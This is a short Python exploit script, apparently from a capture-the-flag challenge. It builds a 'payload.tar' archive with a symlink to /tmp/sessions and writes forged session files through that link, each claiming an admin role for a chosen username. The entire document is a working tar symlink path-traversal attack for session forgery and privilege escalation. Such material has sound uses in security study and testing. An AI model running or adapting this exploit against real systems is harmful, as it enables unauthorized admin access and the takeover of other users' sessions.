from tarfile import TarFile
import subprocess
import json

USERNAME = "noexist"
SESSION_ID_1 = "REDACT"
SESSION_ID_2 = "REDACT"
SESSION_ID_3 = "REDACT"

cmd = subprocess.run(["ln", "-s", "/tmp/sessions","tmp_link"])
data = json.dumps({"username": USERNAME, "id": 1337, "role": "admin"})
f = open(f"malicous_data.txt", "w")
f.write(data)
f.close()
with TarFile("payload.tar", "w") as tarf:
    tarf.add("tmp_link")
    tarf.add("malicous_data.txt", arcname=f"tmp_link/{USERNAME}/{SESSION_ID_1}")
    tarf.add("malicous_data.txt", arcname=f"tmp_link/{USERNAME}/{SESSION_ID_2}")
    tarf.add("malicous_data.txt", arcname=f"tmp_link/{USERNAME}/{SESSION_ID_3}")